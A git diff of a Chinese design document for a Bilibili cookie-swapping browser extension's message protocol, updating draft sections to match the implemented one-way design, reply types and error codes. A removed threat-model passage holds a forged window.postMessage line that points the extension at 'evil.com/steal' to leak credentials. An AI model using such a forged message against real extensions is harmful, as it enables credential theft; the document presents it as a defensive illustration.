@@ -1,6 +1,6 @@
 # 跨环境消息协议
 
-> 状态：草案（v1 骨架阶段定稿）
+> 状态：**已实现**（v0.9.0）
 > 代码真相源：`src/shared/types/messages.ts`
 > 本文档为**解释性摘要**，字段以代码为准
 
@@ -47,54 +47,26 @@ MV3 的四个执行环境内存不共享：
 
 ## 通道 A：MAIN world ↔ ISOLATED world
 
-### 为什么不能省掉 token
+**现行协议是单向的**：MAIN 只上报，ISOLATED 只在 `hello` 时下发一次配置。
+**没有请求-应答**——DNR 在网络层换 Cookie，不需要把请求交给扩展重发
+（[ADR 0010](../decisions/0010-page-proxy-via-tab-ids.md)）。
 
-页面上的任意脚本都能监听 `window.message`。如果没有 token 校验，恶意脚本可以：
+### 防护做了什么、没做什么
 
-```js
-window.postMessage({ __pluma: true, type: 'req', url: 'https://evil.com/steal' }, '*');
-```
+| 机制 | 状态 | 说明 |
+| --- | --- | --- |
+| 命名空间标记 `__ns` | ✅ 双向都验 | 挡住"不知道 NS 的"旁观脚本 |
+| token（ISOLATED → MAIN） | ✅ 已做 | MAIN 在第一个 `cfg` 里锁定 token，之后每条都校验 |
+| token（MAIN → ISOLATED） | ❌ **未做** | ISOLATED 侧只验 `__ns`，不验 token |
 
-然后扩展就会**用播放账号的凭据**去请求攻击者的服务器——凭据直接泄露。
+**未做的那一格为什么现在可接受**：MAIN 上报的内容只影响**画质显示**（徽章、主账号基线）。
+ISOLATED **从不向 MAIN 发送凭据**，凭据只存在于 background，换 Cookie 由 DNR 在网络层完成。
+所以页面伪造上报最多让 popup 显示错误的画质数字，**拿不到任何凭据**。
 
-### 三层防护
+> ⚠️ **不要照旧草案实现"req / res + 8 秒超时"那套。** 它假设"MAIN 把请求交给 ISOLATED 重发"——
+> 那才会泄露凭据，而且这条路早已废弃。完整消息清单看 `entrypoints/content.ts` 的 `listenMainWorld()`。
 
-1. **随机 token**：MAIN world 注入时生成 `crypto.randomUUID()`，只存在于闭包里，通过消息携带
-2. **白名单复检**：ISOLATED world 收到消息后，**不信任何已校验的结论**，重新做一遍 host + pathname + method 校验
-3. **方向限制**：只允许 `req`（MAIN→ISOLATED）和 `res`（ISOLATED→MAIN）两种类型，其他一律丢弃
-
-### 消息形状
-
-```js
-// MAIN → ISOLATED
-{
-  __pluma: 1,            // 协议版本，不匹配直接丢弃
-  token: "<uuid>",
-  type: 'req',
-  id: "<uuid>",          // 用于关联响应
-  payload: {
-    method: 'GET',
-    url: 'https://api.bilibili.com/x/player/wbi/playurl?bvid=...',
-    headers: { ... },
-    body?: string,
-  },
-}
-
-// ISOLATED → MAIN
-{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: true, status: 200, body: "..." }
-{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: false, error: 'not-in-whitelist' | 'http-403' | 'biz--412' | 'timeout' }
-```
-
-### 超时约定
-
-MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（回退主账号）。这个值要比 SW 侧的请求超时短，保证用户不会看到空白播放器。
-
-> ⚠️ **`req` / `res` 是早期草案，从未实现。** 实际方案是 DNR 在网络层换 Cookie，
-> 不需要把请求代理回扩展（见 [ADR 0010](../decisions/0010-page-proxy-via-tab-ids.md)）。
-> 现行消息全部是**单向上报**（MAIN → ISOLATED），没有请求-应答。
-> 完整清单看 `entrypoints/content.ts` 的 `listenMainWorld()`，本文件只记新增的与容易误解的。
-
-### 现行消息里两个容易搞混的（2026-10-26 新增）
+### 现行消息里两个容易搞混的
 
 都用于「主账号基线」（[ADR 0014](../decisions/0014-quality-compare-from-page-data.md)）：
 
@@ -149,7 +121,6 @@ MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（�
 | `qr/generate` | UI→SW | — | 生成二维码 |
 | `qr/poll` | UI→SW | `{ qrcodeKey }` | 轮询扫码状态 |
 | `login/open` | UI→SW | — | 打开隔离窗口登录 |
-| `playinfo/get` | —（未使用） | `{ bvid, cid, qn }` | **已定义但无人收发**。预留给 P3 的取流/体检，`qn` 为 `null` 表示自动取最高 |
 | `proxy/status` | UI→SW | — | 总开关状态（只读） |
 | `proxy/set` | UI→SW | `{ enabled }` | 切换总开关 |
 | `proxy/affected-tabs` | UI→SW | — | 已打开的视频页里还有几个是旧画质（→ `{ count, tabIds }`） |
@@ -158,55 +129,35 @@ MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（�
 | `page/activate` | content→SW | `{ bvid, p, deviceCookies, primaryMid }` | 视频页报到，装 tab 规则 |
 | `page/quality` | content→SW | `{ height, note? }` | 诊断日志 |
 
-### 统一响应包装
+### 响应形状：判别联合，不是 `{ ok, data }`
+
+成功与失败是**两个不同类型**，靠 `type` 后缀区分：
 
 ```ts
-type Reply<T> =
-  | { ok: true; data: T }
-  | { ok: false; code: ErrCode; message?: string };
+| { type: 'account/summary:ok'; configured: boolean; account: AccountSummary | null; needsRecheck: boolean }
+| { type: 'account/summary:err'; code: ErrorCode; detail: string | null }
 ```
 
-**错误码必须枚举**，不许直接返回字符串。因为 UI 要按错误码决定显示哪个状态（见 `docs/02-ui-spec.md` 的七种状态）。
+**为什么不用 `{ ok: boolean; data?: T }`**：那样调用方要先看 `ok` 再判断 `data` 是否为 undefined；
+判别联合让 TS 直接窄化，漏处理 `:err` 分支会编译报错。
 
-```ts
-enum ErrCode {
-  NO_PLAYBACK_ACCOUNT = 'no-playback-account',
-  CREDENTIAL_EXPIRED = 'credential-expired',
-  DNR_RULE_EXHAUSTED = 'dnr-rule-exhausted',
-  BIZ_ERROR = 'biz-error',        // 带 detail: -412 / -101 / -404 ...
-  NETWORK = 'network',
-  TIMEOUT = 'timeout',
-  NOT_IN_WHITELIST = 'not-in-whitelist',
-}
-```
+### 错误码
 
-> ⚠️ **错误码是 UI 与业务的契约。** 新增一种失败原因时，先加错误码，再改 UI，再改实现。反过来做会导致 UI 出现"未知错误"这种无信息量的提示。
+权威位置是 `src/shared/types/errors.ts` 的 `ERROR_CODES`（8 个，UPPER_SNAKE）。
+**本文不抄第二份**——抄一次漂移一次。当前清单：
+`NOT_CONFIGURED` / `CREDENTIAL_EXPIRED` / `PATH_NOT_ALLOWED` / `RULE_POOL_EXHAUSTED` /
+`UPSTREAM_REJECTED` / `NETWORK_ERROR` / `TIMEOUT` / `UNKNOWN`。
 
-### SW 休眠的处理
+**错误码是 UI 与业务的契约**：新增失败原因时先加错误码，再改 UI，再改实现。
+反过来做会让 UI 出现"未知错误"这种无信息量的提示。
 
-MV3 的 SW 在 30 秒无事件后休眠。`sendMessage` 可能抛：
+### SW 休眠
 
-```
-Could not establish connection. Receiving end does not exist.
-```
+MV3 的 SW 在 30 秒无事件后休眠，`sendMessage` 可能抛 `Could not establish connection`。
 
-**统一封装在 `platform/runtime/messaging.ts`**：
-
-```ts
-async function send<T>(msg: Msg): Promise<Reply<T>> {
-  try {
-    return await chrome.runtime.sendMessage(msg);
-  } catch (e) {
-    if (isSwWaking(e)) {
-      await sleep(120);          // 给 SW 一点启动时间
-      return await chrome.runtime.sendMessage(msg);   // 只重试一次
-    }
-    throw e;
-  }
-}
-```
-
-**只重试一次。** 重试多次会掩盖真正的 bug（比如 handler 没注册）。
+**当前没有统一封装层**（`platform/runtime/messaging.ts` 从未创建）——
+只有 3 个 UI 页面，页面里直接调 `chrome.runtime.sendMessage`。
+真要处理冷启动失败，原则是**只重试一次**：重试多次会掩盖 handler 没注册这类真 bug。
 
 ---
 
@@ -216,9 +167,12 @@ UI 有三个入口：popup、options、login window。
 
 ### 关键约束
 
-1. **凭据永不下发给 UI。** UI 只能拿到 `{ uname, mid, vipLabel, expireAt, healthy }`，拿不到 `sessdata`。
+1. **凭据永不下发给 UI。** UI 只能拿到 `AccountSummary`（`src/shared/types/account.ts`）：
+   `{ profile: { mid, uname, avatarUrl }, vipLabel, expireAt, health: { healthy, checkedAt, reason } }`，
+   拿不到 `sessdata`。**这是嵌套结构，不是扁平字段**——别按旧文档写 `{ uname, mid, healthy }`。
 2. **popup 失焦即销毁。** 任何"等用户操作"的长流程都不能在 popup 里跑（见 `docs/02-ui-spec.md` §1）。
-3. **扫码走独立窗口。** popup 点"扫码登录"后，由 SW 或 popup 调 `chrome.windows.create({ type: 'popup' })` 开一个 420×560 的窗口。窗口关闭时通知 SW 清理扫码会话。
+3. **扫码走独立窗口。** `chrome.windows.create({ type: 'popup', width: 420, height: 600, incognito: true })`。
+   窗口关闭时通知 SW 清理扫码会话。
 
 ### 状态推送 vs 轮询
 
@@ -229,16 +183,17 @@ popup 打开 → send({ type: 'account/summary' }) → 渲染对应状态
 （不需要 SW 主动 push，因为 popup 生命周期太短，push 没有意义）
 ```
 
-> ⚠️ **options 页的推送机制尚未实现**（options 页本身是 P3）。
-> 计划是：用户可能停留很久，状态要实时更新，届时由 SW 广播一条新的消息类型，options 页监听。
-> **不要照抄成"已有 `account/health` 广播"**——该消息类型在 `messages.ts` 里不存在，
-> 当前只有拉取式的 `account/summary`。
+> ⚠️ **options 页也没有推送机制，用的是同一套拉取式 `account/summary`。**
+> 不存在 `account/health` 之类的广播类型——`messages.ts` 里没有它。
+> 如果将来要实时更新，得**新增**一条消息类型，而不是假设它已经存在。
 
 ---
 
 ## 协议演进规则
 
-1. **协议版本号 `__pluma: 1` 必须随不兼容改动递增。** 收到不匹配的版本直接丢弃消息，不做兼容转换。
+1. **现行没有版本号字段**，只有命名空间标记 `__ns`（防误收别人的消息）。
+   所以改消息形状必须**两边同时改**（`public/main-world.js` ↔ `entrypoints/content.ts`），
+   没有兼容层兜底。真要引入版本号，等第一次不兼容改动时再加。
 2. **新增字段必须可选**，老版本收到不认识的字段应忽略而非报错。
 3. **删除字段必须先标记 deprecated 一个版本**，再删。
 4. **`shared/types/messages.ts` 是唯一真相源**，本文档从代码抄，不要反向维护。
